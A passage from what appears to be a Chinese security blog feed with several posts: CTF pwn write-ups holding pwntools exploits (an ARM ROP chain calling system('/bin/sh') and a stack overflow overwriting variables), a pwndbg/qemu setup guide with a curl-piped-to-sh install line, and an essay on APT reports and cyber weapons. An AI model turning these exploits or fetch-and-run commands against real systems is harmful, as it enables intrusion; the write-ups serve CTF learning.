class="token operator">&lt;&lt;</span> 112*<span class="token string">'a'</span><span class="token operator">|</span>    pop <span class="token punctuation">{</span>r0,r4,pc<span class="token punctuation">}</span>    <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> p32<span class="token punctuation">(</span>0x20904<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#gadget_addr</span><span class="token operator">|</span>    /bin/sh            <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> p32<span class="token punctuation">(</span>0x6c384<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#/bin/sh_addr</span><span class="token operator">|</span>    junk_data<span class="token punctuation">(</span>r4<span class="token punctuation">)</span>    <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> p32<span class="token punctuation">(</span><span class="token string">"anything"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#r4填充</span><span class="token operator">|</span>    system_addr<span class="token punctuation">(</span>pc<span class="token punctuation">)</span>    <span class="token operator">|</span>    <span class="token operator">&lt;&lt;</span> p32<span class="token punctuation">(</span>0x110b4<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#system函数地址</span></code></pre><p><strong>溢出导致PC指向gadget_addr，然后执行命令pop出栈将”/bin/sh”赋值到r0寄存器，junk_data赋值到r4寄存器，system_addr赋值到PC寄存器。</strong></p></blockquote><h3 id="五-攻破"><a href="#五-攻破" class="headerlink" title="五.攻破"></a>五.攻破</h3><blockquote><p>写出exp:    </p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>__Auther__ <span class="token operator">=</span> <span class="token string">"Yof3ng"</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./typo"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"quit\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x20904</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x6c384</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x110b4</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"echo xiaoyifeng"</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Error!"</span><span class="token punctuation">)</span>    exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"xiaoyifeng"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"getshell"</span><span class="token punctuation">)</span></code></pre><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/15/5bc4518d2ce65.png" class="lazyload"></p></blockquote><blockquote><p>PWN真好玩！😭😭</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> 二进制安全 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux环境配置</title>
      <link href="/2018/10/14/Linux%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
      <url>/2018/10/14/Linux%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p>记录Linux环境配置。</p><a id="more"></a><h1 id="Linux环境配置"><a href="#Linux环境配置" class="headerlink" title="Linux环境配置"></a>Linux环境配置</h1><blockquote><p>​    作为一个信安学习者，和环境打交道是经常的事，那么接下来为二进制学习开始做准备，配置各种架构的调试环境，提高效率。</p></blockquote><h2 id="oh-my-zsh"><a href="#oh-my-zsh" class="headerlink" title="oh-my-zsh"></a>oh-my-zsh</h2><blockquote><p>​    zsh是一个很强大的linux终端shell工具，而oh-my-zsh是一个高效率的配置工具，通过oh-my-zsh可以很快地配置zsh，那么如何进行完整地安装呢：</p><blockquote><p>首先需要安装python的pip，然后安装zsh，再通过<code>sh -c&quot;$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot;</code>命令来安装oh-my-zsh。</p><p>通过修改<code>~/.zshrc</code>里的参数，如主题<code>ZSH_THEME=&quot;random&quot;</code>来设置终端的样式。</p><p>配置zsh语法高亮，<code>git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting</code>通过此命令下载插件，并按下图添加参数<code>zsh-syntax-highlighting</code>。</p><p><img src="https://i.loli.net/2018/10/14/5bc346022c416.png" alt=""></p><p>代码自动补插件下载 <code>git clone https://github.com/zsh-users/zsh-autosuggestions</code> 并放在<code>~/.oh-my-zsh/custom/plugins</code>目录下面，然后像上面一样添加参数即可</p></blockquote></blockquote><h2 id="pwn环境配置"><a href="#pwn环境配置" class="headerlink" title="pwn环境配置"></a>pwn环境配置</h2><blockquote><p>参照m4x大佬的博客<a href="https://m4x.fun/post/how-2-pwn-an-arm-binary/" target="_blank" rel="noopener">https://m4x.fun/post/how-2-pwn-an-arm-binary/</a></p><ul><li>安装 git，gdb 和 gdb-multiarch，同时安装 binfmt*用来识别文件类型</li></ul><pre class=" language-bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">apt-get</span> update$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token function">git</span> gdb gdb-multiarch$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token string">"binfmt*"</span></code></pre><ul><li>安装 gdb 的插件 pwndbg（或者 gef 等支持多架构的插件），需要pip，pip3等模块</li></ul><pre><code>$ git clone https://github.com/pwndbg/pwndbg$ cd pwndbg</code></pre><ul><li>因为我用的是deepin安装的pwndbg（这是个坑点），所以需要对setup.sh稍作修改，如下：</li></ul><pre class=" language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">set</span> -ex<span class="token comment" spellcheck="true"># Helper functions</span>linux<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">uname</span> <span class="token operator">|</span> <span class="token function">grep</span> -i Linux <span class="token operator">&amp;</span><span class="token operator">></span>/dev/null<span class="token punctuation">}</span>osx<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">uname</span> <span class="token operator">|</span> <span class="token function">grep</span> -i Darwin <span class="token operator">&amp;</span><span class="token operator">></span>/dev/null<span class="token punctuation">}</span>PYTHON<span class="token operator">=</span><span class="token string">''</span>INSTALLFLAGS<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">if</span> osx <span class="token operator">||</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token operator">==</span> <span class="token string">"--user"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    INSTALLFLAGS<span class="token operator">=</span><span class="token string">"--user"</span><span class="token keyword">else</span>    PYTHON<span class="token operator">=</span><span class="token string">"sudo "</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token operator">!</span> <span class="token function">hash</span> gdb<span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">echo</span> <span class="token string">'Could not find gdb in <span class="token variable">$PATH</span>'</span>    <span class="token keyword">exit</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true"># Update all submodules</span><span class="token comment" spellcheck="true">#git submodule update --init --recursive</span><span class="token comment" spellcheck="true"># Find the Python version used by GDB.</span>PYVER<span class="token operator">=</span><span class="token punctuation">$(</span>gdb -batch -q --nx -ex <span class="token string">'pi import platform; print(".".join(platform.python_version_tuple()[:2]))'</span><span class="token punctuation">)</span>PYTHON+<span class="token operator">=</span><span class="token punctuation">$(</span>gdb -batch -q --nx -ex <span class="token string">'pi import sys; print(sys.executable)'</span><span class="token punctuation">)</span>PYTHON+<span class="token operator">=</span><span class="token string">"<span class="token variable">${PYVER}</span>"</span><span class="token comment" spellcheck="true"># Find the Python site-packages that we need to use so that</span><span class="token comment" spellcheck="true"># GDB can find the files once we've installed them.</span><span class="token keyword">if</span> linux <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> -z <span class="token string">"<span class="token variable">$INSTALLFLAGS</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    SITE_PACKAGES<span class="token operator">=</span><span class="token punctuation">$(</span>gdb -batch -q --nx -ex <span class="token string">'pi import site; print(site.getsitepackages()[0])'</span><span class="token punctuation">)</span>    INSTALLFLAGS<span class="token operator">=</span><span class="token string">"--target <span class="token variable">${SITE_PACKAGES}</span>"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true"># Make sure that pip is available</span><span class="token keyword">if</span> <span class="token operator">!</span> <span class="token variable">${PYTHON}</span> -m pip -V<span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token variable">${PYTHON}</span> -m ensurepip <span class="token variable">${INSTALLFLAGS}</span> --upgrade<span class="token keyword">fi</span><span class="token comment" spellcheck="true"># Upgrade pip itself</span><span class="token variable">${PYTHON}</span> -m pip <span class="token function">install</span> <span class="token variable">${INSTALLFLAGS}</span> --upgrade pip<span class="token comment" spellcheck="true"># Install Python dependencies</span><span class="token variable">${PYTHON}</span> -m pip <span class="token function">install</span> <span class="token variable">${INSTALLFLAGS}</span> -Ur requirements.txt<span class="token comment" spellcheck="true"># Load Pwndbg into GDB on every launch.</span><span class="token keyword">if</span> <span class="token operator">!</span> <span class="token function">grep</span> pwndbg ~/.gdbinit <span class="token operator">&amp;</span><span class="token operator">></span>/dev/null<span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">echo</span> <span class="token string">"source <span class="token variable">$PWD</span>/gdbinit.py"</span> <span class="token operator">>></span> ~/.gdbinit<span class="token keyword">fi</span></code></pre><pre class=" language-bash"><code class="language-bash">$ ./setup.sh</code></pre><ul><li>安装qemu模拟环境</li></ul><pre class=" language-bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu-user</code></pre></blockquote><blockquote><p>通过 qemu 模拟 arm/mips 环境，进而进行调试 ，</p><p><img src="https://i.loli.net/2018/10/14/5bc34c058efc2.png" alt=""></p><p>运行动态的binary 需要我们查询对应架构的共享库：</p><p><code>apt-cache search &quot;libc6&quot; | grep ARCH</code> </p><p>动态链接的 bianry 需要用对应的 qemu 同时指定共享库路径，例如：</p><p><code>qemu-mipsel -L /usr/mipselbalalbala/  ./add</code></p><blockquote><p>mips（大端）和mipsel（小端）有什么区别呢，在于存储方式，一个是大端（低序存在高地址，按顺序来），一个是小端序（将低序的存在低地址，反常识来）。形象地说：大端是从上往下掉，小端是从下往上飞。</p></blockquote><p>我们只需安装类似 <strong>libc6-ARCH-cross</strong> 形式的即可 ,静态链接的 binary 直接运行即可，会自动调用对应架构的 qemu；</p><p>调试可以使用 qemu 的 -g 指定端口</p><pre class=" language-bash"><code class="language-bash">$ qemu-mipsel -g 1234 -L /usr/mipsel-linux-gnu/ ./add</code></pre><p><img src="https://i.loli.net/2018/10/14/5bc359ad27655.png" alt=""></p><p>然后使用<code>gdb-multiarch</code>进行调试，先指定架构，然后使用remote功能 </p><pre class=" language-bash"><code class="language-bash">pwndbg<span class="token operator">></span> <span class="token keyword">set</span> architecture mips <span class="token punctuation">(</span>但大多数情况下这一步可以省略, 似乎 pwndbg 能自动识别架构<span class="token punctuation">)</span>pwndbg<span class="token operator">></span> target remote localhost:1234<span class="token comment" spellcheck="true">#peda应该问题不大</span></code></pre></blockquote><blockquote><p>下载共享库存在<code>/usr/</code>目录：</p><p><img src="https://i.loli.net/2018/10/14/5bc3583d78da3.png" alt=""></p></blockquote><h2 id="开始使用pwndbg调试"><a href="#开始使用pwndbg调试" class="headerlink" title="开始使用pwndbg调试"></a>开始使用pwndbg调试</h2><blockquote><p> pwndbg正常启动（开心😄）：<img src="https://i.loli.net/2018/10/14/5bc363e61dd11.png" alt=""></p><p>设置好动态调试端口，选择好共享库：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/14/5bc364862d2ce.png" class="lazyload"></p><p>然后用<code>gdb-multiarch</code> -q启动 pwndbg，设置好文件架构，连接端口，开始动态调试：<br><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/14/5bc364ebc9a23.png" class="lazyload"></p></blockquote><blockquote><p>​    对于静态编译的 bianry， 可以使用 lscan, flirt, rizzo, bindiff 等多种方法恢复部分符号表</p><p>加油学习吧！</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Pwn环境配置 </tag>
            
            <tag> qemu </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2017APT报告研读</title>
      <link href="/2018/10/14/2017APT%E6%8A%A5%E5%91%8A%E7%A0%94%E8%AF%BB/"/>
      <url>/2018/10/14/2017APT%E6%8A%A5%E5%91%8A%E7%A0%94%E8%AF%BB/</url>
      
        <content type="html"><![CDATA[<p>2017 APT 报告研读</p><a id="more"></a><h1 id="2017-APT-报告研读"><a href="#2017-APT-报告研读" class="headerlink" title="2017 APT 报告研读"></a>2017 APT 报告研读</h1><h2 id="APT-与网络战争中的大国博弈"><a href="#APT-与网络战争中的大国博弈" class="headerlink" title="APT 与网络战争中的大国博弈"></a>APT 与网络战争中的大国博弈</h2><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; 为什么对APT方面的研究让美国，让中国，让世界各国开始重视起来？据数据，2017年遭受APT攻击最多的国家依次是：美国，中国，沙特，韩国、以色列、土耳其、日本、法国、俄罗斯、德国、西班牙、巴基斯坦和英国。以上这些国家，要么是经济地位领先，要么是拥有大量的能源财富，要么就是社会环境不和平，那么这一系列的因素，都成为了APT攻击的起因。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 而最受APT组织关注的领域或机构类型依次为：政府、能源、 金融、国防、互联网、航空航天、媒体、电信、医疗、化工。正如前不久发生，现在仍在白热化阶段的中美贸易战，为了国家利益而发起的贸易战争；又如朝鲜当前不稳定的社会地位，国家局势，与韩国的争端。再比如说，中东，西亚地区频繁发起的武装冲突。这一切说到的都是现实生活中的局势，但在网络世界中也一样，为了为本国取得一定的优势，网络空间中的APT组织及其活动，则与现实中的大国博弈之间呈现出很多微妙的显性联系。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 既然APT攻击很明显是与国家之间博弈有联系的，这也就能解释为什么指责他国的APT活动成为了重要的外交手段了。</p></blockquote><h2 id="我国对APT的研究应再进一步"><a href="#我国对APT的研究应再进一步" class="headerlink" title="我国对APT的研究应再进一步"></a>我国对APT的研究应再进一步</h2><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; <strong>当今世界，在APT研究领域遥遥领先的是美国，正如各方面美国都处于霸主地位一样，APT研究也不屈居人后</strong>。而中国虽然排在第二名，但只有四个机构发布多篇APT相关研究报告，相比美国的24个机构，美国足足比我们多了六倍，可想而知，其中的各国对APT研究的重视程度也相差甚远。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; <strong>中国已经成为了最大的APT攻击受害者</strong>，很多国家面对中国的发展怀着不同的心思，有的想遏制，有的想帮扶，而想遏制的这些个国家就不停的在各方面费尽心思来对中国进行攻击。统计显示，2017年全年，这些APT组织发动的攻击行动，至少影响了中国境内超过万台电脑，攻击范围遍布国内31个省级行政区。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 在网络空间安全方面，各国几乎都是同样的起点，但却发展成了不同的水平，当前美国领先的可不仅仅是APT攻击方面，而是整个网络安全方面，所以一旦美国发起网络攻击，可以说大多数国家都是没有什么抵抗之力的。<strong>别的国家咱不管，中国，就不应该屈居人下，实现中国复兴，在各方面都应该抓紧，而网络安全，互联网安全正是不可忽视的一点。</strong></p><p>&nbsp; &nbsp; &nbsp; &nbsp; 根据报告我们也可以看出一个非常具有代表性的事实，不仅仅是APT攻击方面，拓展一下，各方面的研究人才，我们相比美国而言都是有劣势的，是大是小则不细说。是当前国情限制的吗？为什么美国就那么多研究型人才呢？就从当前大部分学生毕业等同于失业的现象来说，可能问题就出现在教育体制以及价值取向了。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; <strong>那么回到主题，我认为我国对APT攻击的研究乃至整个网络空间安全技术的研究应该加紧步伐，加强网络防御建设，培养网络攻防人才，这样才能不落人后。</strong></p></blockquote><h2 id="网络军火民用化让网络战争逐渐出现在公众眼前"><a href="#网络军火民用化让网络战争逐渐出现在公众眼前" class="headerlink" title="网络军火民用化让网络战争逐渐出现在公众眼前"></a>网络军火民用化让网络战争逐渐出现在公众眼前</h2><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; <strong>什么是网络军火？</strong>网络军火是一种网络武器，即军火级的网络漏洞利用工具。就像去年永恒之蓝勒索蠕虫病毒（WannaCry）肆虐全球，导致150多个国家，30多万受害者遭遇勒索软件 攻击，医疗、交通、能源、教育等行业领域遭受巨大损失。WannaCry据称是美国国家安全局（NSA）旗下方程式组织（Equation Group）所开发的网络武器，是一款典型的网络军火。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; <strong>我认为网络军火需要严格把控，否则后果不堪想象。</strong> 网络军火大多由一个或者多个高精尖技术团队研发而成，而当前网络空间安全法律制度薄弱，不像现实生活中，限制枪械军火，有严格的法律来保障权益。正是如此，网络空间也就成为了许许多多龌龊苟且，黑暗邪恶事物的藏身之地。而当今各国的网络空间基本上是有防火墙相互隔绝的，也就是说，网络空间也有国界之分，那么自然而然，网络战争这种低成本高效益且隐匿的攻击方式理所当然地就上升到了国家层面。一旦网络军火民用化程度越来越高，而且网络军火的自动化程度也在变高，那么各种APT组织也就会变得更加强大，不仅仅是APT组织，很难想象几乎每个人都会用网络军火来进行攻击，而网络空间已经变成战火之地的场景。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 网络军火严格把控的同时要发展自己的力量。据报告了解到，美国政府十分重视网络军火的研发，以及利用，拥有属于自己的网络军火库，一个是NSA旗下的方程式组织，另一个据称是美国中情局（CIA）直属的网络情报中心。根据新华社报道，截止2016 年底，CIA直属的网络情报中心拥有超过5000名员工，总共设计了超过1000个木马、病毒和其他“武器化恶意代码”。 而2017年，从特朗普政府大幅提高军事预算的政策倾向看，CIA从事网络武器库开发人员数量会大幅增加。 而上述的这些，都是美国的网络军火力量。试问，如果美国的网络军火我们都扛不住，如何去抵抗现实生活中的战争？这不是未战先垮吗？</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 总之，网络军火级工具和普通的恶意软件、渗透工具等结合后，让很多 攻击行为同时具备高级攻击手段和一般手段的特性，增加了犯罪分子的隐蔽性，也会干扰监测识别高级威胁。 <strong>所以，某种程度上，网络军火民用化抬升了安全研究者的门槛，增加了APT的防控难度，网络安全企业任重道远。我国在研究如何抵抗这种网络军火攻击的同时，也应该也加大网络军火的研发力度，一味的防守只会让自己处于被动的状态，只有自己也拥有能够威胁到敌方的力量，才能护我国和平发展之路。</strong></p></blockquote><hr><blockquote><p> 以上仅属个人观点，若有不符，还望斧正。</p></blockquote><p>参考：</p><p><a href="https://ti.360.net/blog/articles/apt-report-of-2017/" target="_blank" rel="noopener">2017中国高级持续性威胁（APT）研究报告 </a></p><p><a href="http://cpc.people.com.cn/xuexi/n1/2018/0817/c385476-30234135.html" target="_blank" rel="noopener">习近平谈网络安全：没有网络安全就没有国家安全</a></p><p><a href="https://www.doit.com.cn/p/251027.html" target="_blank" rel="noopener">肖新光：APT的本质是大国博弈，我们生与斯，长与斯，不义之财我们分文不取，祖宗之地我们寸土不让</a></p>]]></content>
      
      
      <categories>
          
          <category> 杂文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> APT </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Pwn-10月14-护网杯</title>
      <link href="/2018/10/13/Pwn-10%E6%9C%8814-%E6%8A%A4%E7%BD%91%E6%9D%AF/"/>
      <url>/2018/10/13/Pwn-10%E6%9C%8814-%E6%8A%A4%E7%BD%91%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<p>……</p><a id="more"></a><h1 id="Pwn-10-13"><a href="#Pwn-10-13" class="headerlink" title="Pwn-10/13"></a>Pwn-10/13</h1><blockquote><p>​    今天打了护网杯，从之前的强网杯，到国赛，到铁三，到Xman，再到网鼎杯，最后到了今天的护网杯，经历的比赛倒是挺多，只是进步微乎其微，实在汗颜，希望接下来能有较大的进步！</p><p>​    write-up友链：<a href="https://supery4ng.github.io/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AFWP/" target="_blank" rel="noopener">https://supery4ng.github.io/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AFWP/</a></p><p>​    护网杯关键词：<code>python tornado模板注入(STTI)</code>,<code>条件竞争</code>,<code>辣条</code>,<code>溢出</code>,<code>自闭</code></p></blockquote><h2 id="gettingstart"><a href="#gettingstart" class="headerlink" title="gettingstart"></a>gettingstart</h2><blockquote><p>​    这相当于今天pwn的签到题，简单但详细地复原一下：</p><p>​    第一步，IDA看一看，逻辑十分简单，甚至可以直接写payload：</p><p><img src="https://i.loli.net/2018/10/13/5bc20e49c32cb.png" alt=""></p><p>​    突破点是通过read函数，在buf处进行溢出，进而覆盖v7，v8的值，达到else的条件，即v7==0x7FFFFFFFFFFFFFFF,v8==0.1。</p><p>​    这里我们需要知道的是，浮点数在内存中表现的形式是什么样子的，它与普通的整型不同，会做出转换，比较晦涩。这里简单写一个C语言程序看看0.1是怎么表示的：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">double</span> a<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%lf"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>​    通过<code>gcc -o test test.c -z noexecstack -no-pie</code>进行编译，然后使用gdb看看：</p><p><img src="https://i.loli.net/2018/10/13/5bc213eed9cfc.png" alt=""></p><p>​    显而易见，0.1是用0x3fb999999999999a表示的，那么在接下来的exp中就应该这样写:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./task"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#p=remote("117.78.26.114",31498)</span>payload<span class="token operator">=</span><span class="token string">""</span>payload<span class="token operator">+=</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">24</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x7FFFFFFFFFFFFFFF</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x3FB999999999999A</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#cmd="cat flag"</span><span class="token comment" spellcheck="true">#print p.recv()</span><span class="token comment" spellcheck="true">#print payload</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#p.send(cmd)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print p.recv()</span></code></pre><p>运行exp，效果图：</p><p><img src="https://i.loli.net/2018/10/13/5bc214f6668a4.png" alt=""></p></blockquote><h2 id="验证数组越界"><a href="#验证数组越界" class="headerlink" title="验证数组越界"></a>验证数组越界</h2><blockquote><p>​    写一段简单的代码来验证一下，新生经常会犯错的数组越界问题</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>        a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>        a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>​    运行结果：</p><p><img src="https://i.loli.net/2018/10/14/5bc299e356904.png" alt=""></p><p>​    因为a[4]并不在我们定义的数组范围，属于数组越界，接下来调试一下看看具体情况：</p><p><img src="https://i.loli.net/2018/10/14/5bc2998608bee.png" alt=""></p><p>​    而就在0，1，2，3后面是不是我们运行输出的那个值呢？正是如此，因为我们通过a[4]访问的并不是我们曾经定义过的元素，而是程序运行中的产生的随机值，如函数地址等。</p></blockquote><h2 id="验证int溢出"><a href="#验证int溢出" class="headerlink" title="验证int溢出"></a>验证int溢出</h2><blockquote><p>​    在64位系统中 <code>int</code>型变量是占用4个字节大小的，而4个字节用16进制表示就是<code>0x00000000-0xffffffff</code>，并且正数负数都在其中，而负数是用补码表示的，<code>0x7fffffff&lt;=&gt;2147483647</code>，<code>0x80000000=2147483648&lt;=&gt;-2147483648</code>。</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> i<span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"四个字节最大值0x7fffffff十进制为:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token number">0x7fffffff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入你想要赋给int的值:\n"</span><span class="token punctuation">)</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>运行结果：</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/14/5bc29c77aa16d.png" class="lazyload"></p><p>​    果不其然，我们赋给int的2147483648变成了负数，-2147483648。</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/14/5bc29d54a35a3.png" class="lazyload"></p></blockquote><blockquote><p>have a good weekend everybody!</p></blockquote>]]></content>
      
      
      <categories>
          
